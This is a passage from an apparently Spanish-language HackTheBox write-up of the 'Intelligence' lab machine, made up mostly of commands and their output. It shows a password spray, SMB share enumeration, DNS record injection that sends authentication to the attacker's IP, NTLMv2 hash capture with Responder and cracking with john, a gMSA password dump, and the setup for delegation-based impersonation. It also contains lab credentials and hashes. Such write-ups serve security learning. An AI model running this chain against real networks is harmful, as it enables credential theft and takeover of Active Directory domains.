SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\J</span>ason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\J</span>ason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\J</span>ennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\J</span>essica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\J</span>ohn.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\J</span>ose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\K</span>aitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\K</span>elly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\N</span>icole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\R</span>ichard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\S</span>amuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\S</span>cott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\S</span>tephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\T</span>eresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\T</span>homas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\T</span>homas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>+] intelligence.htb<span class="se">\T</span>iffany.Molina:NewIntelligenceCorpUser9876 
</code></pre></div></div>

<ul>
  <li>Tenemos credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /bin/cat creds.txt
Tiffany.Molina:NewIntelligenceCorpUser9876 
</code></pre></div></div>

<ul>
  <li>Las credenciales son para el protocolo <code class="language-plaintext highlighter-rouge">SMB</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.248 <span class="nt">-u</span> Tiffany.Molina <span class="nt">-p</span> <span class="s2">"NewIntelligenceCorpUser9876"</span>
SMB         10.10.10.248    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:intelligence.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.248    445    DC               <span class="o">[</span>+] intelligence.htb<span class="se">\T</span>iffany.Molina:NewIntelligenceCorpUser9876 
</code></pre></div></div>

<ul>
  <li>
    <p>Como tenemos credenciales validas podemos probar un Kerberoasting Attack para solicitar un <code class="language-plaintext highlighter-rouge">TGS</code> <a href="https://book.hacktricks.xyz/v/es/windows-hardening/active-directory-methodology/kerberoast">https://book.hacktricks.xyz/v/es/windows-hardening/active-directory-methodology/kerberoast</a>.</p>
  </li>
  <li>
    <p>Pero no es vulnerable.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-GetUserSPNs intelligence.htb/Tiffany.Molina:NewIntelligenceCorpUser9876
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

No entries found!
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Podemos enumerar por <code class="language-plaintext highlighter-rouge">SMB</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.248 <span class="nt">-u</span> <span class="s1">'Tiffany.Molina'</span> <span class="nt">-p</span> <span class="s1">'NewIntelligenceCorpUser9876'</span> <span class="nt">--no-banner</span>
<span class="o">[</span><span class="se">\]</span> Checking <span class="k">for </span>open ports...                                                                                                  <span class="o">[</span>|] Checking <span class="k">for </span>open ports...                                                                                                  <span class="o">[</span>/] Checking <span class="k">for </span>open ports...                                                                                                  <span class="o">[</span>-] Checking <span class="k">for </span>open ports...                                                                                                  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB connections<span class="o">(</span>s<span class="o">)</span> and 1 authenticated session<span class="o">(</span>s<span class="o">)</span>                                                      
                                                                                                                             
<span class="o">[</span>+] IP: 10.10.10.248:445	Name: dc.intelligence.htb 	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	IT                                                	READ ONLY	
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closed 1 connections                                                                        
</code></pre></div></div>

<ul>
  <li>Vamos a ver que es lo que hay dentro de Users.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-U</span> Tiffany.Molina //10.10.10.248/Users
Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\T</span>iffany.Molina]:
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                  DR        0  Sun Apr 18 20:20:26 2021
  ..                                 DR        0  Sun Apr 18 20:20:26 2021
  Administrator                       D        0  Sun Apr 18 19:18:39 2021
  All Users                       DHSrn        0  Sat Sep 15 02:21:46 2018
  Default                           DHR        0  Sun Apr 18 21:17:40 2021
  Default User                    DHSrn        0  Sat Sep 15 02:21:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 02:11:27 2018
  Public                             DR        0  Sun Apr 18 19:18:39 2021
  Ted.Graves                          D        0  Sun Apr 18 20:20:26 2021
  Tiffany.Molina                      D        0  Sun Apr 18 19:51:46 2021

		3770367 blocks of size 4096. 1437659 blocks available
smb: <span class="se">\&gt;</span> 
</code></pre></div></div>

<ul>
  <li>Vemos la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> <span class="nb">cd </span>Tiffany.Molina<span class="se">\</span>
smb: <span class="se">\T</span>iffany.Molina<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Sun Apr 18 19:51:46 2021
  ..                                  D        0  Sun Apr 18 19:51:46 2021
  AppData                            DH        0  Sun Apr 18 19:51:46 2021
  Application Data                DHSrn        0  Sun Apr 18 19:51:46 2021
  Cookies                         DHSrn        0  Sun Apr 18 19:51:46 2021
  Desktop                            DR        0  Sun Apr 18 19:51:46 2021
  Documents                          DR        0  Sun Apr 18 19:51:46 2021
  Downloads                          DR        0  Sat Sep 15 02:12:33 2018
  Favorites                          DR        0  Sat Sep 15 02:12:33 2018
  Links                              DR        0  Sat Sep 15 02:12:33 2018
  Local Settings                  DHSrn        0  Sun Apr 18 19:51:46 2021
  Music                              DR        0  Sat Sep 15 02:12:33 2018
  My Documents                    DHSrn        0  Sun Apr 18 19:51:46 2021
  NetHood                         DHSrn        0  Sun Apr 18 19:51:46 2021
  NTUSER.DAT                        AHn   131072  Sun Aug 11 17:42:51 2024
  ntuser.dat.LOG1                   AHS    86016  Sun Apr 18 19:51:46 2021
  ntuser.dat.LOG2                   AHS        0  Sun Apr 18 19:51:46 2021
  NTUSER.DAT<span class="o">{</span>6392777f-a0b5-11eb-ae6e-000c2908ad93<span class="o">}</span>.TM.blf    AHS    65536  Sun Apr 18 19:51:46 2021
  NTUSER.DAT<span class="o">{</span>6392777f-a0b5-11eb-ae6e-000c2908ad93<span class="o">}</span>.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Sun Apr 18 19:51:46 2021
  NTUSER.DAT<span class="o">{</span>6392777f-a0b5-11eb-ae6e-000c2908ad93<span class="o">}</span>.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Sun Apr 18 19:51:46 2021
  ntuser.ini                        AHS       20  Sun Apr 18 19:51:46 2021
  Pictures                           DR        0  Sat Sep 15 02:12:33 2018
  Recent                          DHSrn        0  Sun Apr 18 19:51:46 2021
  Saved Games                         D        0  Sat Sep 15 02:12:33 2018
  SendTo                          DHSrn        0  Sun Apr 18 19:51:46 2021
  Start Menu                      DHSrn        0  Sun Apr 18 19:51:46 2021
  Templates                       DHSrn        0  Sun Apr 18 19:51:46 2021
  Videos                             DR        0  Sat Sep 15 02:12:33 2018

		3770367 blocks of size 4096. 1437659 blocks available
smb: <span class="se">\T</span>iffany.Molina<span class="se">\&gt;</span> <span class="nb">cd </span>Desktop
smb: <span class="se">\T</span>iffany.Molina<span class="se">\D</span>esktop<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                  DR        0  Sun Apr 18 19:51:46 2021
  ..                                 DR        0  Sun Apr 18 19:51:46 2021
  user.txt                           AR       34  Sun Aug 11 17:33:28 2024

		3770367 blocks of size 4096. 1437643 blocks available
smb: <span class="se">\T</span>iffany.Molina<span class="se">\D</span>esktop<span class="se">\&gt;</span> get user.txt
getting file <span class="se">\T</span>iffany.Molina<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt of size 34 as user.txt <span class="o">(</span>0.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.1 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\T</span>iffany.Molina<span class="se">\D</span>esktop<span class="se">\&gt;</span> 
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>user.txt
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: user.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ d07ff52158e75818a204e25d39744c93
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre></div></div>

<h2 id="shell-as-nt-authority-system-and-root-flag">Shell as nt authority system and root flag</h2>

<ul>
  <li>Si seguimos enumerando encontramos un script en powershell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-U</span> Tiffany.Molina //10.10.10.248/IT
Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\T</span>iffany.Molina]:
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Sun Apr 18 19:50:55 2021
  ..                                  D        0  Sun Apr 18 19:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 19:50:55 2021

		3770367 blocks of size 4096. 1437627 blocks available
smb: <span class="se">\&gt;</span> get downdetector.ps1 
getting file <span class="se">\d</span>owndetector.ps1 of size 1046 as downdetector.ps1 <span class="o">(</span>2.4 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 2.4 KiloBytes/sec<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Este script lo que esta haciendo es acceder a LDAP y obtiene una lista de todas las computadoras, luego recorre aquellas cuyo nombre comienza con “web”. Intentará realizar una solicitud web a ese servidor (usando las credenciales del usuario en ejecución), y si el código de estado no es 200, enviará un correo electrónico a Ted.Graves para informarle que el host está caído. El comentario al principio indica que está programado para ejecutarse cada cinco minutos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>downdetector.ps1
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: downdetector.ps1   &lt;UTF-16LE&gt;
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <span class="c"># Check web server status. Scheduled to run every 5min</span>
   2   │ Import-Module ActiveDirectory 
   3   │ foreach<span class="o">(</span><span class="nv">$record</span> <span class="k">in </span>Get-ChildItem <span class="s2">"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb"</span> | Wh
       │ ere-Object Name <span class="nt">-like</span> <span class="s2">"web*"</span><span class="o">)</span>  <span class="o">{</span>
   4   │ try <span class="o">{</span>
   5   │ <span class="nv">$request</span> <span class="o">=</span> Invoke-WebRequest <span class="nt">-Uri</span> <span class="s2">"http://</span><span class="si">$(</span><span class="nv">$record</span>.Name<span class="si">)</span><span class="s2">"</span> <span class="nt">-UseDefaultCredentials</span>
   6   │ <span class="k">if</span><span class="o">(</span>.StatusCode <span class="nt">-ne</span> 200<span class="o">)</span> <span class="o">{</span>
   7   │ Send-MailMessage <span class="nt">-From</span> <span class="s1">'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;'</span> <span class="nt">-To</span> <span class="s1">'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;'</span> <span class="nt">-Subje</span>
       │ ct <span class="s2">"Host: </span><span class="si">$(</span><span class="nv">$record</span>.Name<span class="si">)</span><span class="s2"> is down"</span>
   8   │ <span class="o">}</span>
   9   │ <span class="o">}</span> catch <span class="o">{}</span>
  10   │ <span class="o">}</span>
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre></div></div>

<ul>
  <li>Podemos robar un hash con esta herramienta para inyectar un record <a href="https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/dnstool.py">https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/dnstool.py</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 dnstool.py
usage: dnstool.py <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="o">[</span><span class="nt">-u</span> USERNAME] <span class="o">[</span><span class="nt">-p</span> PASSWORD] <span class="o">[</span><span class="nt">--forest</span><span class="o">]</span> <span class="o">[</span><span class="nt">--legacy</span><span class="o">]</span> <span class="o">[</span><span class="nt">--zone</span> ZONE] <span class="o">[</span><span class="nt">--print-zones</span><span class="o">]</span> <span class="o">[</span><span class="nt">--tcp</span><span class="o">]</span> <span class="o">[</span><span class="nt">-k</span><span class="o">]</span>
                  <span class="o">[</span><span class="nt">-port</span> port] <span class="o">[</span><span class="nt">-force-ssl</span><span class="o">]</span> <span class="o">[</span><span class="nt">-dc-ip</span> ip address] <span class="o">[</span><span class="nt">-dns-ip</span> ip address] <span class="o">[</span><span class="nt">-aesKey</span> hex key] <span class="o">[</span><span class="nt">-r</span> TARGETRECORD]
                  <span class="o">[</span><span class="nt">-a</span> <span class="o">{</span>add,modify,query,remove,resurrect,ldapdelete<span class="o">}]</span> <span class="o">[</span><span class="nt">-t</span> <span class="o">{</span>A<span class="o">}]</span> <span class="o">[</span><span class="nt">-d</span> RECORDDATA] <span class="o">[</span><span class="nt">--allow-multiple</span><span class="o">]</span> <span class="o">[</span><span class="nt">--ttl</span> TTL]
                  HOSTNAME
dnstool.py: error: the following arguments are required: HOSTNAME
</code></pre></div></div>

<ul>
  <li>Vamos a poner que el nombre que comienza con web para que todo funcione.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 dnstool.py <span class="nt">-u</span> <span class="s1">'intelligence.htb\Tiffany.Molina'</span> <span class="nt">-p</span> <span class="s1">'NewIntelligenceCorpUser9876'</span> <span class="nt">-r</span> webmiguel <span class="nt">-a</span> add <span class="nt">-t</span> A <span class="nt">-d</span> 10.10.14.30 10.10.10.248
<span class="o">[</span>-] Connecting to host...
<span class="o">[</span>-] Binding to host
<span class="o">[</span>+] Bind OK
<span class="o">[</span>-] Adding new record
<span class="o">[</span>+] LDAP operation completed successfully
</code></pre></div></div>

<ul>
  <li>Vamos a capturar el trafico como ya se inyecto el DNS record y se ejecute el script la autenticación ira hacia nosotros y vamos a ver el hash del usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>responder <span class="nt">-I</span> tun0
</code></pre></div></div>

<ul>
  <li>Después de unos minutos nos llega el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>responder <span class="nt">-I</span> tun0
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguelrega7: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  <span class="nt">-__</span>|__ <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-__</span>|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0

  To support this project:
  Github -&gt; https://github.com/sponsors/lgandx
  Paypal  -&gt; https://paypal.me/PythonResponder

  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
  To <span class="nb">kill </span>this script hit CTRL-C


<span class="o">[</span>+] Poisoners:
    LLMNR                      <span class="o">[</span>ON]
    NBT-NS                     <span class="o">[</span>ON]
    MDNS                       <span class="o">[</span>ON]
    DNS                        <span class="o">[</span>ON]
    DHCP                       <span class="o">[</span>OFF]

<span class="o">[</span>+] Servers:
    HTTP server                <span class="o">[</span>ON]
    HTTPS server               <span class="o">[</span>ON]
    WPAD proxy                 <span class="o">[</span>OFF]
    Auth proxy                 <span class="o">[</span>OFF]
    SMB server                 <span class="o">[</span>ON]
    Kerberos server            <span class="o">[</span>ON]
    SQL server                 <span class="o">[</span>ON]
    FTP server                 <span class="o">[</span>ON]
    IMAP server                <span class="o">[</span>ON]
    POP3 server                <span class="o">[</span>ON]
    SMTP server                <span class="o">[</span>ON]
    DNS server                 <span class="o">[</span>ON]
    LDAP server                <span class="o">[</span>ON]
    MQTT server                <span class="o">[</span>ON]
    RDP server                 <span class="o">[</span>ON]
    DCE-RPC server             <span class="o">[</span>ON]
    WinRM server               <span class="o">[</span>ON]
    SNMP server                <span class="o">[</span>OFF]

<span class="o">[</span>+] HTTP Options:
    Always serving EXE         <span class="o">[</span>OFF]
    Serving EXE                <span class="o">[</span>OFF]
    Serving HTML               <span class="o">[</span>OFF]
    Upstream Proxy             <span class="o">[</span>OFF]

<span class="o">[</span>+] Poisoning Options:
    Analyze Mode               <span class="o">[</span>OFF]
    Force WPAD auth            <span class="o">[</span>OFF]
    Force Basic Auth           <span class="o">[</span>OFF]
    Force LM downgrade         <span class="o">[</span>OFF]
    Force ESS downgrade        <span class="o">[</span>OFF]

<span class="o">[</span>+] Generic Options:
    Responder NIC              <span class="o">[</span>tun0]
    Responder IP               <span class="o">[</span>10.10.14.30]
    Responder IPv6             <span class="o">[</span>dead:beef:2::101c]
    Challenge <span class="nb">set</span>              <span class="o">[</span>random]
    Don<span class="s1">'t Respond To Names     ['</span>ISATAP<span class="s1">', '</span>ISATAP.LOCAL<span class="s1">']

[+] Current Session Variables:
    Responder Machine Name     [WIN-Z9A9SBGSGZR]
    Responder Domain Name      [1RV7.LOCAL]
    Responder DCE-RPC Port     [45229]

[+] Listening for events...

               
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:6260985d3bd0347a:615B680BCA6559DEAB2A1A811C5F50AB:01010000000000002D4C359475ECDA0198F61145958356E00000000002000800310052005600370001001E00570049004E002D005A00390041003900530042004700530047005A0052000400140031005200560037002E004C004F00430041004C0003003400570049004E002D005A00390041003900530042004700530047005A0052002E0031005200560037002E004C004F00430041004C000500140031005200560037002E004C004F00430041004C000800300030000000000000000000000000200000F9E145FD22ACC32AA1C9D74B89FF7116BCD9740D7EA44791204DE1C72F2FEF6E0A0010000000000000000000000000000000000009003E0048005400540050002F007700650062006D0069006700750065006C002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
</span></code></pre></div></div>

<ul>
  <li>Vemos la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
No password hashes left to crack <span class="o">(</span>see FAQ<span class="o">)</span>
                                                                                                                                
❯ john <span class="nt">--show</span> hash.txt
Ted.Graves:Mr.Teddy:intelligence:6260985d3bd0347a:615B680BCA6559DEAB2A1A811C5F50AB:01010000000000002D4C359475ECDA0198F61145958356E00000000002000800310052005600370001001E00570049004E002D005A00390041003900530042004700530047005A0052000400140031005200560037002E004C004F00430041004C0003003400570049004E002D005A00390041003900530042004700530047005A0052002E0031005200560037002E004C004F00430041004C000500140031005200560037002E004C004F00430041004C000800300030000000000000000000000000200000F9E145FD22ACC32AA1C9D74B89FF7116BCD9740D7EA44791204DE1C72F2FEF6E0A0010000000000000000000000000000000000009003E0048005400540050002F007700650062006D0069006700750065006C002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000

1 password <span class="nb">hash </span>cracked, 0 left
                                                                                         
</code></pre></div></div>

<ul>
  <li>Las credenciales son correctas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.248 <span class="nt">-u</span> <span class="s1">'Ted.Graves'</span> <span class="nt">-p</span> <span class="s1">'Mr.Teddy'</span>
SMB         10.10.10.248    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:intelligence.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.248    445    DC               <span class="o">[</span>+] intelligence.htb<span class="se">\T</span>ed.Graves:Mr.Teddy 
</code></pre></div></div>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">bloodhound</code> para enumerar el dominio y ver vías de escalar privilegios y obtener una shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ bloodhound-python <span class="nt">-c</span> All <span class="nt">-u</span> <span class="s1">'Ted.Graves'</span> <span class="nt">-p</span> <span class="s1">'Mr.Teddy'</span> <span class="nt">-ns</span> 10.10.10.248 <span class="nt">-d</span> intelligence.htb
INFO: Found AD domain: intelligence.htb
INFO: Getting TGT <span class="k">for </span>user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW<span class="o">(</span>Clock skew too great<span class="o">)</span>
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains <span class="k">in </span>the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc.intelligence.htb
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 43 <span class="nb">users
</span>INFO: Found 55 <span class="nb">groups
</span>INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.intelligence.htb
INFO: Done <span class="k">in </span>00M 29S
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>neo4j console
</code></pre></div></div>

<ul>
  <li>Una vez hacemos todo el proceso de neo4j ejecutamos el <code class="language-plaintext highlighter-rouge">bloodhound</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ bloodhound &amp;&gt; /dev/null &amp;
<span class="o">[</span>1] 96907
</code></pre></div></div>

<ul>
  <li>Nosotros como el usuario <code class="language-plaintext highlighter-rouge">Ted.Graves</code> podemos ver la contraseña de <code class="language-plaintext highlighter-rouge">SVC_INT</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/4.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/5.png" />
</p>

<ul>
  <li>Podemos usar la siguiente herramienta <a href="https://github.com/micahvandeusen/gMSADumper">https://github.com/micahvandeusen/gMSADumper</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 gMSADumper.py <span class="nt">-u</span> <span class="s1">'Ted.Graves'</span> <span class="nt">-p</span> <span class="s1">'Mr.Teddy'</span> <span class="nt">-l</span> 10.10.10.248 <span class="nt">-d</span> intelligence.htb
Users or <span class="nb">groups who </span>can <span class="nb">read </span>password <span class="k">for </span>svc_int<span class="nv">$:</span>
 <span class="o">&gt;</span> DC<span class="err">$</span>
 <span class="o">&gt;</span> itsupport
svc_int<span class="nv">$:</span>::4c395675187a74271de7c4af867ad417
svc_int<span class="nv">$:</span>aes256-cts-hmac-sha1-96:cd87c9ddd67ecee7f918e83fc5506eb1cd8f8d114a4c2e763ae0340c949a777c
svc_int<span class="nv">$:</span>aes128-cts-hmac-sha1-96:541f7fe57df7994bbf6d0312a8849f94
</code></pre></div></div>

<ul>
  <li>Tenemos el privilegio de <code class="language-plaintext highlighter-rouge">AllowedToDelegate</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/6.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/7.png" />
</p>

<ul>
  <li>Podemos usar esta herramienta de <code class="language-plaintext highlighter-rouge">impacket</code> para el <code class="language-plaintext highlighter-rouge">impersonate</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-getST <span class="nt">-h</span>
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

usage: getST.py <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="o">[</span><span class="nt">-spn</span> SPN] <span class="o">[</span><span class="nt">-altservice</span> ALTSERVICE]
                <span class="o">[</span><span class="nt">-impersonate</span> IMPERSONATE]
                <span class="o">[</span><span class="nt">-additional-ticket</span> ticket.ccache] <span class="o">[</span><span class="nt">-ts</span><span class="o">]</span>
                <span class="o">[</span><span class="nt">-debug</span><span class="o">]</span> <span class="o">[</span><span class="nt">-u2u</span><span class="o">]</span> <span class="o">[</span><span class="nt">-self</span><span class="o">]</span>
                <span class="o">[</span><span class="nt">-force-forwardable</span><span class="o">]</span>
                <span class="o">[</span><span class="nt">-hashes</span> LMHASH:NTHASH] <span class="o">[</span><span class="nt">-no-pass</span><span class="o">]</span> <span class="o">[</span><span class="nt">-k</span><span class="o">]</span>
                <span class="o">[</span><span class="nt">-aesKey</span> hex key] <span class="o">[</span><span class="nt">-dc-ip</span> ip address]
                identity

Given a password, <span class="nb">hash </span>or aesKey, it will request a
Service Ticket and save it as ccache

positional arguments:
  identity              <span class="o">[</span>domain/]username[:password]

options:
  <span class="nt">-h</span>, <span class="nt">--help</span>            show this <span class="nb">help </span>message and <span class="nb">exit</span>
  <span class="nt">-spn</span> SPN              SPN <span class="o">(</span>service/server<span class="o">)</span> of the
                        target service the service
                        ticket will be generated <span class="k">for</span>
  <span class="nt">-altservice</span> ALTSERVICE
                        New sname/SPN to <span class="nb">set </span><span class="k">in </span>the
                        ticket
  <span class="nt">-impersonate</span> IMPERSONATE
                        target username that will be
                        impersonated <span class="o">(</span>thru S4U2Self<span class="o">)</span> <span class="k">for
                        </span>quering the ST. Keep <span class="k">in </span>mind
                        this will only work <span class="k">if </span>the
                        identity provided <span class="k">in </span>this
                        scripts is allowed <span class="k">for
                        </span>delegation to the SPN specified
  <span class="nt">-additional-ticket</span> ticket.ccache
                        include a forwardable service
                        ticket <span class="k">in </span>a S4U2Proxy request
                        <span class="k">for </span>RBCD + KCD Kerberos only
  <span class="nt">-ts</span>                   Adds timestamp to every logging
                        output
  <span class="nt">-debug</span>                Turn DEBUG output ON
  <span class="nt">-u2u</span>                  Request User-to-User ticket
  <span class="nt">-self</span>                 Only <span class="k">do </span>S4U2self, no S4U2proxy
  <span class="nt">-force-forwardable</span>    Force the service ticket
                        obtained through S4U2Self to be
                        forwardable. For best results,
